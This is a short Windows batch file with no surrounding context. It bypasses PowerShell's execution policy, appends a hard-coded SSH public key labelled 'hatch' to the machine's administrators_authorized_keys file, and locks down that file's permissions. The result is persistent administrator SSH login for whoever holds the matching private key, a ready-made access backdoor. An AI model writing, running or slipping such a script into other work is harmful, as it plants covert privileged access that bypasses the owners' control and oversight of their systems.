@echo off
powershell -ExecutionPolicy Bypass -Command "Add-Content -Path 'C:\ProgramData\ssh\administrators_authorized_keys' -Value 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIONT+DrtPQs4JnLQAP411G3ijWTnYDaf5lU6Op9MCemf hatch'; icacls 'C:\ProgramData\ssh\administrators_authorized_keys' /inheritance:r /grant 'Administrators:F' /grant 'SYSTEM:F'"
echo Done. Press any key to close.
pause >nul
